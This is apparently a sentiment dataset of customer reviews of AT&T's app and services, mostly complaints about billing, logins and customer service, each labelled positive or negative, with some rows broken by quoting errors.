"“High Speed” Internet is a joke. It buffers constantly. Poor choice of TV channels. I received a “free iPhone” for changing to AT&T. They charged me $90 for the phone stating I would get that money back after 90 days. It’s been 6 months and it still hasn’t been refunded. Every month my bill has been different...as much as $801 and I only have 1 TV, 1 phone, a flip phone for my elderly mother and alleged high speed internet.  I have had to fight with them every month over my bill. I paid my true bill every month after my monthly fight on the phone spending hours on the phone with them and speaking with up to 13 different people in one phone call to resolve this issue. When I switched from U-Verse to Direct TV they tried to charge me $300 for U-Verse Cable Boxes I returned 4 1/2 years ago. It’s been a nightmare. I’d give them -5 stars if I could. I can’t wait until my contract is up. Now it won’t post this without a nickname. I’ve tried several. ??",negative
I love this!,positive
Y’all don’t want me to write a review cause it would not be nice. Because I don’t understand how the hell my bill got this high and how in the hell do you expect me to pay it!!!!!,negative
"Used to love this app.  After the last update, the app does not refresh. Pretty much useless now.",negative
I’m so disappointed in AT&T billing break down.,negative
"Keep getting, for many hours, L569 try again in a few minutes. Also, trying to access via web, tried, different browsers, get message saying to clear cache.",negative
"I represent a large corporation and what I train my team on most importantly is, “ Our customers are the core of what we do, and without these customers we will not succeed.” 
I say this with the utmost concern for this company and the level of customer service that I have witnessed while excepting a offer with AT&T. The offer itself after 5 months of service of buy one get one on the devices that lured me in, have continued to  reflect that I’m responsible for both devices. At&T representatives have lied about the billing, while their confusion to this matter and several others is embarrassing for the employees that you employ. What does AT&T do about it .... well following hours of exhausting disputes that confirm the error on AT&T’s billing , AT&T has refused to do anything about it until I pay the bill that I’m not responsible for or they refuse to talk to me about the matter that they are responsible for. How convenient for AT&T. The company I represent will convey the message to consumers that are interested in what the core is for AT&T. 
Thank you.",negative
"So far everything is great, my new iPhone XR’s are amazing! The app for my bill is easy to understand and detailed. It’s been seamless. 

My Verizon friends are jealous of the deals AT&T offers especially the one I got, 4 new phones for the price of 2 (BOGO deal) with free internet for life. The speed of this network is fast, super fast...I haven’t had any buffering issues like I had with T-Mobile. I can watch a movie with no interruptions on Bart, with a strong connection. 

My family plan is unlimited, everyone is happy. AT&T made it very easy to port my phone numbers over to the new network I just needed my pin from T-Mobile, I typed it in and they did the rest! We all received texts and emails confirming the lines had transferred successfully. 

I love the attention to details with this company, I plan to stay.",positive
App is buggy. Website and the application have a lot in common. The app is constantly logging me out randomly when I navigate through it. Parts of my account randomly don’t show up. My general experience with ATT online account management features (this app and the website) is way below expectations for a technology company.,negative
"While I have been happy, overall, with MyATT online service, getting new/updated charges without warning to our DATA plan on our bill was unwelcome. It also took far too long to receive our credit for the promotion the store offered, when we purchased our latest round of phones, which has contributed to my general dissatisfaction with the ATT service. My family have been longtime ATT customers, but I don’t feel like we have been treated as such.",negative
Makes paying bill much easier.,positive
What is the point of the fingerprint if you have to remember your password in order to confirm it? Pointless,negative
You can’t always review your account it freezes this app is the only app I can’t use on regular basis for it freezes and you can’t select options for your account.,negative
They take care of their customers and always help. I love you guys! ????,positive
"Runs way to slow, and temperamental",negative
"The app isn’t allowing me to pay my bill, like I’ve been doing every month!
I have to keep putting in my password. This app has become useless!",negative
"Extremely slow to outright unresponsive. Cannot delete unwanted notices. Payments should show up when received - NOT two days later. 7/7- again, it takes way too long for payment credit to show up in app",negative
This app displays your bill the way they want you to see it.  Can it give additional details on users? I am still looking for that feature.,negative
"It works, and they work to “improve” it, but sometimes it’s buggy, sometimes it’s hard to navigate, and sometimes your bill goes up a dollar a month for the last 6 months and it’s like, why?
Are there service providers who don’t do that? 
The app works, it makes it simple to pay your ever increasing bill, at least the current release of it does.",negative
"It’s been quite a while since I’ve been able to sign into the app.  It’s just a never ending circle of it saying I don’t know my password, getting a new one and it says I don’t know my password again.  I even enabled Face ID and still can’t sign in.",negative
"I try to rely on the App for bill payment and keeping up my accounts, but it only seems to work when I’m not making payments...",negative
"I’ve been with AT&T for ten years.  I’ve continued to have poor service for ex: no consistency WIFI connection while at home.  I’ve  spent well over 24 hours on the phone and online with tech support.  As well as a field representative, twice to my home to attempt to resolve the poor quality of service.  I’ve paid over data charges on numerous occasions due to the buffering, in attempt to connect to WiFi or web.  I’m definitely looking for a more reliable carrier  to meet my needs.  I’ve also called numerous times to cancel my internet due to poor quality of service.  Only to be placed on hold, then transferred to another person, etc, resulting in me hanging up due to extensive length of being on hold.  I’m basically paying for something I’m not able to enjoy.",negative
"Although the app may offer things that a customer would want, the inability to sign in, use facial recognition, or store a password fails every single time. I consistently have to re-enter all my information. Then it says it doesn’t recognize my device, so it has to send me a code. It’s the most annoying app I’ve encountered.",negative
Cannot log into my account from the app to pay my bill. Said send code to verify it is me. I entered the 6 digit code and told me try again in a few minutes!  Poorest customer experience and customer service is almost always nonexistent.,negative
"Terrible service, terrible!!!",negative
Half the time it doesn’t work and it’s usually pretty slow,negative
In one single transaction where I made a payment and then tried to set up a new split payment and you took $581. Not what I had budgeted. Thanks for f’ng me!,negative
"I like the app for the most part, but half of the time it freezes up or doesn’t let you look at your account which makes it useless fifty percent of the time.",negative
Bad bad bad and all possible nicknames are taken so almost impossible to post a review,negative
"Your website is completely unreliable 
Links don’t work and information is very difficult to locate, mostly due to links not working 
It’s worked poorly for years 
Strange that a tech/communication company has a consistently non-functioning website",negative

Always need to be transferred to someone else after 45 min of repeating issue over and over 
Then once transferred conveniently disconnected.

"This app has never worked well. Always lags, keeps sending me back to the same page. Very frustrating.",negative
Everything is so slow!,negative
I am NOT able to sign into my email for the past three days. Was told that ATT& Yahoo are separating. As a result they are having issues. I had to call almost everyday to tech support for help. The last time I called resulted in talking to a supervisor which said that she will call me back. I’M STILL WAITING FOR THAT PHONE CALL!!!!!  This kind of service is totally unacceptable!!!!,negative
Easy to use app.,positive
Love the app for your bill never have problems other than slowly loading. But when it comes to purchasing anything it’s a hassle. It’s annoying to have to keep going back to the same page over and over. And when I tried putting something in my cart it would ask if I wanted to check out. I select check out rather than keep shopping and then it would continue to say I have nothing in my Cart. This is ridiculous! And don’t usually write bad reviews unless it’s a constant issue. And THIS IS A CONSTANT ISSUE. How can y’all be a perfectly good wireless service company but lack on the app? That makes no sense! It loads and loads and loads forever! Makes me never want to purchase accessories because the app makes it so difficult. Get your app together. It’s literally been the same issue for the last 3 years that I remember and now I remember why I never purchased anything from the app. Freaking RIDICULOUS! SUPER UNSATISFIED. GET IT TOGETHER!,negative
Att is the best,positive

"This app doesn't let you see your real-time data. 
Several times when traveling I’ve wanted to be able to track my usage for phone time and data but you are not given any access to current info about your billing. You can only see the last months charges. You still have to actually call att to get current info. The employees have access to your real time data. Not sure why the customers don’t?",negative
"Traveled international, put the international day pass on my lines, hour with customer service. They never put it on my lines, called again spoke with international, still didn’t get it on. Received a large bill, called customer service again, they hung up on me, had to call back again, Customer service is horrible!!! I’m sorry I left Verizon.",negative
GREAT APP,positive
I have had nothing but problems with ATT the last 6 months. I am a long time customer but have had enough and will be looking at switching carriers ASAP.,negative
Why can’t I use the app if I’m a prepaid user?????,negative
I rated At&t app one star because it’s so clunky and hard to find what you need.,negative
As big a company as ATT is they drown you in unhelpful ness and confusion to elicit more late payments and fees even though you are already being charged a “car payment” a month for service.,negative
I’m unable to to my bill because the app is frozen and won’t update,negative
I can rarely access this app or the one for Digital Life. The logins constantly time out. This has been going on for months. Please FIX THIS!!!,negative

Lousy service every time I call my bill get higher and higher  this is it !!!!!,negative
Why did my bill get raised,negative
"If I could leave AT&T I would. Application and website are utter and complete garbage. They only work half the time and has so many glitches.

Welcome to “we get our money, who cares about the customer.”",negative

You guys have the worst speed Internet and soon as you get on the game it freezes and lag it’s horrible service and you pay so much for really bad Wi-Fi I don’t get you guys Xfinity is better than AT&T and y’all need to fix your Wi-Fi because it’s terrible I hate your Wi-Fi I hate your service and I hate AT&T,negative

Among constant freezing up, blank screens constantly, today I wanted to watch the Breeders Cup on local channel 11 & the screen had text on it that stated this was not in my lineup today to watch because the owner, Nexstar had removed it!! Switching back to Dish soon & Verizon!",negative
I LOVE how you show if each part of the bill has gone up or down!,positive
I like ATT&T it’s a little expensive but I like the service could be more cheaper more competitive with sprint and T-Mobile at 35 per line for new phone and service but maybe one day,positive
I changed my password and it continues to say that something is wrong when I sign in. Hate the app!!! I’ll try to contact customer service!!!,negative

Friday, the 28th, Monday the1st and today, the 3rd, we waited at home to no avail.

I have been told that the appointments show up but no ticket has been sent to the techs. I don’t care if it is a human in India or the USA or a robot, this is crappy service.

Now I have been rescheduled for the 11th! It’s about time I see some compensation for my time on the phone and time waiting at home for no shows.

I would not recommend this company to anyone. They have to do some serious groveling for me to trust this company again.

The people on Chat for Directv do not fix anything!  I’ve been trying to take off the NFL package for months but I’m still getting charged.

AT&T seems to find a way ever month to charge me more. Always check your bill with this company. They are NOT customer focused. After 20 years they are forcing me to look at other carriers.,negative

It hell trying to speak to a reparable person about ANYTHING, your employees tells lie about given discount that never happens n I have never had one that could help. I need to talk to someone about a better combined service or look somewhere else for it. That statement, you are important to us and you are a part of ATT thanks is false advertising because you pay for your services even when you are not receiving all of them, you have to pay for everything that you use n most time you have to fix your own problems.

I have an issue every month with my bill and when I call to dispute it they act like it’s such a bother for them to fix it. Also, none of the reps speak clear enough English to even understand what I am talking about. I plan on switching my phone service and my tv service in the very near future! I only gave them 1 star cause it wouldn’t let me give a 0 ??",negative

Every month my bill is wrong. Every month I have to call and wait on hold only to be transferred to the right person who usually is the wrong person. You changed my plan last month because mine is no longer available. The new plan is more expensive. That’s ridiculous. The amount of charges that make no sense are ridiculous. I’ve been a customer for over 10 years. Highly disappointed. And I just called about this months incorrect bill and got hung up on as he was taking a look. Awesome. Thanks for nothing atnt.,negative

Also, when I added internet to my account a month ago, I tried to combine my bills and it still says they are working on it. Now my phone bill is due but it won’t show me the balance so I can pay it.",negative
"The service is worthless down here I guess they have more profitable markets to improve

"Recently, I learned that my wireless 5GB plan no longer covers my cell phone needs. And even  though I hate to pay more, I’m prepared to do whatever I need to do for convenience. But before I self-selected the 9GB plan through my phone app, I asked to “chat” with an AT&T rep.  Two reps and 20 mins of combined waiting, verifying and having numbers just tossed out at me, I gave up.  After all those minutes, the reps could not explain how I could supposedly pay less, but get more. My suspicion was that I was losing something in the exchange, but the reps appeared too busy to explain exactly what. So I said, “I’m done! Goodbye” and ended the “chat”. I still need the 9GB plan, so eventually I’ll go to the app, read my options and just make the change myself.  I wonder if the AT&T reps understand how they are contributing to their own obsolescence? Oh well, not my issue but I’ll use the AT&T app from now on.",negative

Why is it so confusing to keep up with my account. I have to call to get my account straightened out. It’s showing me an account that has been canceled from an old property 3 months later. Why? To confuse me that my current account is cancelled? Who knows. I can’t wait until the bundling of my accounts are straightened out and is behind me.,negative
Nothing but problems with this company. Had so many issues that are never resolved on time. Not sure how they stay in business.,negative

"It’s a crock. Without going into details, I have several accounts. The very one (satellite) I need yo view, I can’t get it. I’ve even tried to log in as a new account on it. But nooo! I’ve got my WiFi by itself and I can look at it just fine. I have my phone and my sisters phone on an account, plus she bundled her satellite. So THAT is all I can see. I will be calling tomorrow. Oh, and I had to change my programming today. Quoted my next statement to be around $135/$140. It’s $160! Liar is all he was. If it’s not fixed, I’m canceling. Can hardly get any WiFi here. Slowest crap ever. I need to cancel that too.",negative
Quick.  Simple.  Easy.  Enough said!!!,positive
"Horrible! Hi can a simple thing that should never change, then change!? By even a penny!? Look, it’s pretty simple. This company said my bill is X amount of dollars and unlimited including taxes, fees etc. but the same, and it has never been that way, BY FAR!!! I drive a $50,000 car and my payment for that car is the same!!! Not a penny more or less. Please AT&T stop extorting from people by misleading videos and you can “save her” blurbs. It’s uncalled for. How about this. I’ll do what you do and pay you what I feel like paying but the only similarity will be that it’s on time the rest will be whatever I want it to be. It’s a joke to say the least.",negative

I do not recommend ATT service to anybody.  Customer Care for service issues is non-existent.  Nothing but double talk.,negative
"Cannot view my bill. Just spin and spins and tells me something along the line of, “We’re almost there!” Not only that...but attempts at sending this poor review is impossible. Apparently every conceivable nickname is taken. I have been VERY disappointed with AT&T’s customer service lately...and especially its international service. After being a loyal customer for 23 years...I’m switching to Verizon.",negative

App update just made it trash. Can’t see my bill and when I call to get a paper bill only because the app won’t work they want to charge me to send it to me.,negative
"For a conglomerate that pretty much runs the world, AT&T has the worst app and not much better customer service.",negative
I feel like the charges for my internet is too much due to the varying degrees of service on a daily basis.  Not one of the phones on my bill can use WiFi and then watch Netflix tv at the same time because service is so poor.,negative
So sick of them throttling my Internet speeds. I pay 150 a month for unlimited (what a scam) internet and they throttle my hotspot at 33 gigs. What a joke. It’s now unusable and I’m still paying exorbitant prices. No one cares about customer loyalty anymore.,negative
Online Payment process for Direct TV is garbage!,negative
This is the worst app. Every time the app just stay at the loading page!,negative

Only reviewing because it keeps popping up which is annoying.   Maybe now it will stop popping up,negative
Frustratingly hard to use on iphone   Does it ever work? Not for me.,negative
With every update navigation must be hunted out. Leave it alone already! Quit getting us comfortable with one way of doing it and then making it so different it takes a professional tracker to figure out where to find things.,negative
I have been trying to get in touch with TV people because my TV is not on and this app is terrible and no help. I would like a phone number to be able to call a real person to report that my TV does not work.,negative

It has an unfinished feel. Like a patched together thing that barely works.,negative
The app glitches too much,negative
"When the app works fine, however most the time it’s very Slow!",negative
Sent me an email that I owed $44 and they turned around and told me I owed $150. Email is being sent to FCC for this billing fraud,negative
"I have to reset my password. Every. Single. Time. I use the app. It says I haven’t been on in a while. It’s been a few weeks. Who uses this app every day? It’s ridiculous. Then after resetting, I still have to enter it two to three times before it’s accepted. 

The next issue, which has been an issue for a very long time, is the slow load times. Every new area I go to takes forever to load. It’s a fast phone with good service. This is the only app that loads like a Play Station 1. It’s easily the worst app I have. 

Navigation of the app is also not very simple. I’m able to eventually accomplish my goal, but it’s not easy, and absolutely not quick. 

How is an app, designed for my phone provider, this terrible to use on my phone.",negative
Have called tech support four times now and still have issues logging on. Keep getting error notices that my account number or if are not recognized. After over ten years as an AT&T customer I am truly disappointed with the direction AT&T has gone.  I felt as if their customer service people did not really care about my account and just wanted me to Hang up. I ended up having to go back to paper billing and have them mail me a bill in order to sure I can get my account paid on time.,negative
"My U-verse service has been horrible since connection. I thought my old carrier was bad but the service now is absolutely no good.
I am just upset that I pay so much monthly and this is the lousy service I get. I have given up calling in for service because it does not make a difference. I will go back to my old carrier because the service was way better than what I am getting now.
I have been a loyal customer for many many years——just thought I would get some better service.
Hope I will get a response to this review.

Thanks

Awesome,positive
"No more than one bar at my home for the past 3 months. Always had better service prior to that.
When traveling service is in and out. It’s not the phone. I upgraded and my husband has the same problem with service limitations. 
When traveling across country sometimes we have service, others we do not. 
Clunky website, works slowly or not at all.",negative
I used to love this app as it allowed me to easily view my account details. With all of these updates and changes I constantly have to log into the app. It’s also making view my account details impossible as i can never get anything to load in the app now. I’ve deleted the app and reinstalled it but it still works the same. There needs to be some changes made and go back to the way the app was.,negative

"I became a customer in Feb 2019, I was treated very good when the sells Rep come to my home talked me into switching over to U-Verse. I paid my 250.00 Dep for television and an additional 150.00 for my internet service. So all in all in total I paid $400 in  deposits. Was promised $150 visa gift card for signing up I never received that was also promised to have my TV for two years with the price of $150 and my Internet was $40 so all in all let’s say $190 plus tax so let’s say about 210.00 a month!! I have been deck disconnected three times since February because my bill was extremely high and then once they disconnect me as you guys know it’s a $35 restoration fee plus late fees and everything else which adds an additional $50 on top of my bill AT&T is full of crap I do not recommend you guys to anybody! I have been treated so poorly but AT&T doesn’t want to fix it they just wanna roll out the red carpet until they get your money and turn your service on and then treat you like dirt and I’m not the only one Who has said this and who has experienced this my neighbors four of my neighbors said they got treated the same way but now we’re locked in for 24 months thanks a lot AT&T",negative
"The title says it all. I can’t view my Direct TV account or my Digital Life accounts or make payments or change account options from this app. I only have access to my wireless and u-Verse internet accounts from this app. For those other AT&T accounts, I have to use other apps. I’m not sure which one of those is worse, the DigitalLife or DirecTV! I’ll have to write separate bad reviews for those apps. Because they are also both horrible. But this one is even more horrible. The only thing it is good for is paying bills for my wireless & u-verse internet accounts. It’s not good for much anything else other than paying bills. It needs a complete do over and start from scratch. And get AT&T customer feedback while developing the new app. Because the people that developed this one clearly do not want have AT&T accounts or use this app for them.",negative
"We have been told numerous things from AT & T Account Specialists that are ALWAYS CONTRADICTED BY THE NEXT CALL TO ANOTHER ASSOCIATE TO TRY N SOLVE ALL THE ISSUES WITH OUT SERVICE...

Your app is NOT user friendly!,negative
"Every time I go to review my account it takes forever. I have so many screenshots of myAT&T saying to wait... and several minutes later... still waiting. AT&T should know better about web latency issues - it’s a web service provider! I should not be waiting minutes for my account information to load and this happens on all different platforms and networks... on the iPhone app, on my Mac using Safari, at home or somewhere else. Shameful!",negative
For two days I have been trying verify my ID within the app.  The “verification code” process is not working.  No texts are being sent to any of my registered cellphones.  In-store help was no help either.,negative

It’s slow always freezes up. Takes 10 minutes to make a payment,negative
Not a single employee understands the words”Ownership of problem”. Any simple problem require multiple calls and 2-4 hours on the phone. Employees are trained to pass the buck. No one leaves notes of conversation,negative
"The online virtual assistant is a joke, why even have it. Not to mention every time you call and talk to a live person you are told a different thing each time!",negative
Customer service is very bad.  Keep overcharging by 60 to 80$ every month.  Have to call to get bill fixed.,negative
"So I try my hardest to pay all my bills regardless of my situation and if this paycheck doesn’t allow me to pay one bill I pay it on the next. I got charged a late fee of $9.25 for a $10 internet bill that is already a low income internet for those who can’t afford the $40 plan. I mean I’d understand a $2-5 late fee but a fee just as high as my internet bill so now I have to pay $19.25. Regardless of how much the internet bill is some people already have it hard. I was late on my car, house, kids & mine life insurance until payday my insurance company didn’t charge me a late fee. Yet at&t is out here doing the most to make it and that’s a very wrong hand to deal in today’s society. If I didn’t need this internet for my kids I would cut it off and use my T-MOBILE internet only.",negative
Nearly every time I I try to sign in it has lost my information! They insist on trying to find it or create a different sign in information! I hate trying to figure out how to access my account just to pay them! They make it unnecessary hard! I have a lot of apps and none of them is so narcissistic to have customers spend the kind of time and aggravation just to access the account and pay them!,negative

They refused to give me a full refund for the first account. I was supposed to get 100 gigs, I get 50 gigs. Worst customer service who only know how to transfer, doesn’t know/understand products. Tried to sell me more of their crappy service. Have to pay for a phone I don’t want. Supposed to get up to 15 download, get 1.5.

It just gets better.  The multiple accounts feature in terrific.,positive
I changed my cell plan when told I was getting a better rate and would not effect me in any way then to realize now I would not qualify for free HBO even if I still had my unlimited service.

Like it was written for a.blind 3 year old.",negative
"Every single time I have an issue (which is a lot) I always get an agent that is rude and cuts me off or talks over me. They don’t listen or acknowledge my concerns. They don’t partner with me to get anything fixed, they always say no and don’t even think of different ways to make it right. I’m switching to a different company because of all the disappointment AT&T has created.",negative
"Has all the hallmarks of underpaid and overworked product managers and experience designers. Workflows that dead end, automation loops you can’t escape, and a chat button that is in the way of the information you need. 

I would not show this app in my portfolio if I worked on it.",negative
Mobile app is clumsy and difficult to navigate. Password criteria is too limiting and strict.,negative
"The app does not highlight when there are changes to your plan. If you have paperless billing, you need to open the PDF of the bill via the app, and scroll to the end to see if AT&T is making any changes. Too bad they are not up front and notifying customers directly through the app. Supposedly, this new change is to prepare for 5G but Customer Support could not tell me if it will be in my area and if so, when. Poor form AT&T.",negative
"To be honest I don’t use the App very often. I will check my usage occasionally, but other than that I just use it to make my payment. It is very easy to navigate and I can make my payment with just a few taps.",positive
If you have different accounts services you can’t use the same app for both.,negative
"I am always an upbeat and over positive person in all situations but you all have completely wore me down. It’s been one headache after the other. Since the moment I left my 25 year reign with Sprint and gave your company a chance, it’s been one hurdle and obstacle after the other. From randomly making me pay &700 for my phone or you wouldn’t turn my services back on, after I had it for 2 months, to charging me for UVERSE and Direct TV at the same time and I only have one TV l, to the constant robooting the internet or troubleshooting why cable won’t work.. it’s a weekly struggle with you people. I have never seen such horrible customer service in a my days of living. I have no idea why you are still in business to be quite frank. I have spent almost the entire day, fixing the TV THEN troubleshooting the wireless system and it’s STILL NOT WORKING but I bet my life that I am getting charged for every UNUSED minute.",negative
"Funny how anytime you want to unlock a phone, drop a line, or cancel service AT&T has technical glitches. So you’re force to call and waste precious time listening to their sales reps trying to upsell you on services you don’t want or need.",negative

I have been told that the appointments show up but no ticket has been sent to the techs. I don’t care if it is a human in India or the USA or a robot, this is crappy service.

Now I have been rescheduled for the 11th! It’s about time I see some compensation for my time on the phone and time waiting at home for no shows.

I would not recommend this company to anyone. They have to do some serious groveling for me to trust this company again.",negative
Need to have an option to select a date when to pay.  I want to pay next week but I can only make a payment today.  Don’t like !,negative
"I don’t write reviews often but this app is DIFFICULT.   Takes forever to navigate to what you’re looking for,  it usually end up back on the home screen just when you think you’re getting somewhere.
Difficult to get answers to questions as they all tend to have the same answer.
Billing section takes a while to get to and figure out, but at least you can see your itemized bill.
Finally, the app is just poorly designed.   Do not recommend.",negative

This app is much harder to use.  Terrible.,negative

I purchased a new apple XR buy one get one. I realized I didn’t have anyone to give it to so I took it back to the AT&T store in Sherwood Oregon. I purchased it on May 10 and returned it on May 21 and was hassled by the manager Chris. He gave me a really hard time after 2 hours of being there he finally took the phone back and told me I would be getting the credit  back however when my bill came this month it showed on my bill that it was never processed and when I called a rep of AT&T they told me it was never processed and I was still being charge. I have all the paper work to prove it but the manager has not called me back. He was very rude when I purchased it and when I returned it he he was very rude. The person that waited on me had to keep asking Chris ( the manager) how to do some things. His name is Johnathan. Please help me resolve this. I was on the phone with a AT&T rep for 1 and a half hour trying to resolve this but he couldn’t because he said it was never processed  if I could I would cancel my AT&T. I have been with them for over 20 years and never has an issue with them till now. The manager at this store was the most rude person I have ever met. I need this issue fix now because I am paying for a phone I don’t have,negative
"This app is useless to me. I tried everything from reloading the app to changing passwords, but when I try to sign in, it freezes on the screen asking to what number I want a verification code sent. Thus, it’s useless to me. I hate it.",negative
Gracias,positive
The app is ruined. You can’t do anything now. It never loads and when it does it won’t show anything. 4 other people have the same problems. Fix it back!,negative
"I feel like every time we get buy one phone get one free, we end up paying full price for both. Our bone bill is out the roof for 3 phones anyways. Our phones don't even have good services at our home. So we pay all this money and noon can talk to us at our home unless we stand outside. Crazy",negative
As soon as my phone was paid off Bluetooth and other features stop working isn’t that convenient,negative
App is limited. Waited too long to chat. And the call center agent could not be understood due to the language barrier.,negative
"Despite being logged into MyATT, I cannot even find my my AT&T wireless bill and/or activity.  I have called multiple times to link all of our accounts and can only see DirecTV info.",negative
I have been with AT&T for over 15 years. Their customer service has plummeted. Everything I’m told will be done does not happen! I have 3 phones on this account and have to figure out how I can strategically move to another service provider for both my phone and the stupid (Directv) cable provider I got talked into signing with. I am dumbfounded and angry! I don’t have 2-3 hours to spend waiting/talking to someone to have nothing done. I’m out as soon as I can be!,negative
"Slow connection. Cannot always get into my account. Loading to get into my account takes forever! Isn’t that what ATT calls using  “DATA”? They’ll charge an arm and a leg for data overage, but won’t take accountability for their slow connection. Today I was finally able to get into my account after a week of not being able to get on.  It’s an inconvenience. Speaking to a representative over the phone has been useless. They can’t do much to help except rile you up.  My experiences with ATT has not been pleasant and at this time I can’t stand them!",negative
"Spoke to Katrina over the phone in regards to a question I had in regards to my bill, I was being charged monthly for a free phone I received back In 2017 BOGO deal promotion they had at the time. She was able to credit my money back to my next bill but said “thats all she can do, I’m not even going to try” All I asked was to get my money back into my bank account for my current bills. I was treated unprofessionally, she was very rude and would talk over me when I would explain the situation. I have always loved AT&T and there service but lately its just issue after issue. AT&T needs to better train there staff on promotions they have going on, in store employees do give any details on the current offers or “free phone” that isn’t free. Also, I did not appreciate the fact that I was switched over to a new plan without my consent, I was not notified changes were being made and I now have a different plan that’s more expensive but have no choices but to continue for about a month and switch to an alternative carrier like Verison. Changes need to be made in this company, Alot of people are very unhappy and have nothing good to say about AT&T. Fix it",negative
So sad that a technology company has yet to master creating an app that’s user friendly.,negative
"I only wanted to see what was the cost of my wireless plan, and when I would be charged. This seems impossible on this app. It also seems impossible by telephone after only getting other options and machines. There are plenty advertisements, however. Does this company employ human beings anymore? I could not reach one by phone or chat.",negative
"The problems with att go way beyond a working app. I understand I can’t really complain about att since I still choose them as our current choice for our services. Overall ATT is still on the lowest rung of the ladder when it comes to ease of dealing with issues with they’re services. Oh, and possibly THE WORST company that creates problems as they try to solve other problems. Yes, YOUR system (ATT) creates problems as you try to solve others, and it takes 3-4 months of OUR time to solve them.",negative
This is the second time your software updates have interfered with logging into my account. Yeah ask me makes for a security breach and don’t you know it.,negative

The process is cumbersome. The same document are required repeatedly. The service is horrible too,negative

I have waited for a long time for something to be as easy as it was to pay my bill today. Who rah for whoever came up with the system!,positive
"I have been told on numerous occasions that my bill would be $60.00 usd lower than what I’m being charged for, I have spent hours on the phone trying to get this fixed. I’m ready to switch carriers, I am tired of being lied to. I’m over AT&T it had been to speak reason with the “associates” to figure out what is going on. Unfortunately no longer. So sad.",negative
Been with att since beginning of time it’s seems. But must part ways ASAP can’t afford the prices any more so ATT you win we’re gone,negative
The app has been very good for a long time.  The most recent update is a dud though.  App gives inaccurate information and doesn’t update.,negative
"This is a nice app...  WHEN it works. You’d think as a major technology company they could write and app with no issues, but nope...  apparently they can’t. First I had an issue where the app wouldn’t show me my data usage and it took 6 weeks for them to fix that, and now it asks me to “confirm” my password every time I log in, with no discernible way to do so!",negative
Keeps timing out very quickly. No matter even if rebooting several times. Works on iPhone but not on iPad. What’s up,negative
When I log in with Touch ID it asks to confirm password. I do confirm it and then it says session timed out. It switches to account screen but won’t let me pay the bill when clicking on “make payment”,negative
Horrible horrible customer service,negative
A true picture of unreliability. I hate it but am stuck with ATT,negative
Does not show billing amount for ya. Does not break down individual amount for each phone,negative
"Have to change my password every month to pay my bill

Been a Directv customer since 1992 and now I can’t sign into that app either since AT&T is the owner. Very unhappy. But they do not care!!!!! Verizon and Dish in my future!!!",negative
"The app stopped working with the April 2019 update. It won’t let me sign on. It asks me to text a code to one of my lines to authenticate and it either doesn’t send the code at all or when it does send the code and I input it it says something went wrong sending me back to start all over. I used to use the app all the time, but I can’t use it at all now on my phone.  I reported it but they couldn’t solve it.",negative
Great app!,positive
"Slugger it take for ever not friendly use, im Tech savvy bu older people have a hard time navigating. Its time att either fires  the developer or really get on there behind and make this app friend user, i considering switching all my 5 lives yo Verizon",negative
"I guess you can’t expect much from an oligarch on monopoly other than what you get from ATT. The app is terrible, it doesn’t work half the time, and of course trying to call the company is impossible. Even when you want to pay the bill it fails. When is somebody else going to be competing for any of this consumer business?",negative
"My signal at home is only one bar, i cannot get open my email when Im outside my house with my data on. You are billing but not improving your service. Call many times",negative
Terrible coverage and very unreliable. I’ve been a customer for 22 years and it’s ridiculous the amount AT&T continues to charge for the horrible service. I still do not understand how they (AT&T) can run those false ads on tv about being the number one provider. It’s finally time to join the others and make the switch to a better company.,negative
If I had another source I would be gone. Both AT&T and Direct TV.,negative
Some links weren’t working. I wanted to upgrade but couldn’t,negative
It is absolutely ridiculous that when I call AT&T customer service I end up talking to someone stationed in the Philippines or wherever overseas call centers the call is been sent to and then when you talk to someone they can barely speak or understand English and I end up having to talk to a supervisor here in the United States there are people here in the United States that need jobs and AT&T is basically an American made company and should beHiring people from the United States not overseas for as much money that I pay for cable every month I shouldn’t have to go through all this aggravation if I have the chance I will definitely cancel my service as soon as my contract obligations are over,negative
I love the At&t app easy to use now I’m never late on payments ????,positive
Touch ID login hasn’t worked for months and I don’t know why. Frustrating,negative
"difficult to navigate and make changes, and I still have to waste time on the phone while customer service reviews my account, just to refer it to the back office, that never follows up.

I dont understand how my bill is gradually going up again. Pretty tired of paying way too high of a bill. Will be dropping this plan as soon as i can and signing up with a provider that actually offers a realistic affordable price and doesnt randomly up charge. Not to mention maybe ill get honest people when i go into the other providers store instead of someone giving me a sales pitch and telling me lies only for me to find out a month later i have to keep paying said high amount that was told to me to be a one time thing. Just over all disappointed. And please dont call me with a person that i cant understand half of what they say or if anything at all. Ill pay for my plan to be terminated that same day if it does and go somewhere else where ill probably be paying half the bill and probably have half the issues. Thanks.,negative
"I have been on the phone for three months trying to get DIREC-TV off of my bill. I tried to cancel DIRECTV and Internet because AT&T did not provide those services in my new area. I’ve literally spent about 72 hours on the phone in the last three minutes if not more. Customer service was very rude. And kept passing me off to the next department with out warning. I am absolutely disgusted with the level of service that was provided in the last three months, with me try to get things straight. Even tho service is back on, on my phone. I’m still thinking about canceling my service with att.",negative
"Never saves my password. Crashes, slow and generally clunky. No thank you.",negative
"Your service is horrific. I was on the phone trying to change my password for Directv. Talked to 3 different people, and the only resolution was they locked my Directv account and changed my phone account password. Which I told them not to change.

Keep getting Login timed out message.,negative
"I have ENOUGH SECURITY on my apps, my phone, my bank accounts! I do NOT need your app to CONSTANTLY ask me for my password- it’s annoying!",negative

I absolutely love being able to see each line I have on my account for my children and keep up with their usage and text! And it breaks down everything!! I am new to the AT&T next program and so far so good?? ??,positive

"Been an Att customer for a very long time.   Ever since cell phones were available.  4 I phones to be exact.  U-verse and internet too.  U-verse and Att Internet is absolutely horrible. 

Comcast Infinity might be in my future.  For $515 a month, I can do better.",negative
"I don’t use the App often, yet, easily 75% of the time I access it there’s some type of issue. Not the leader in technology I would hope for.",negative
It barely works. Doesn’t work when I use data with it and barely works with my WiFi. It was last updated a month ago and I can’t even pay my bill on the app right now. It only has 1 out of 5 starts because I can’t give it 0.,negative
"This app keeps “processing” the login identity.  Since the update, I can’t access my accounts.",negative
Logs off automatically and I have to create a new passcode. Cell phone plans are expensive and easily can go over data.,negative
"I chose tactical support from the options. Your agent, with a foreign accent, advised she could definitely take care of the problem, as I explained it to her. I told her I only had limited time as we would be losing our cell in the mountains. Then after 15 minutes she transfers me to “technical support“. I was required to start from the beginning, as she, agent #2, had no idea about the prior information I had given agent #1. I lost contact, as we were now driving through the mountains. Agent #1 was a waste of my time.",negative
Will not verify with code,negative
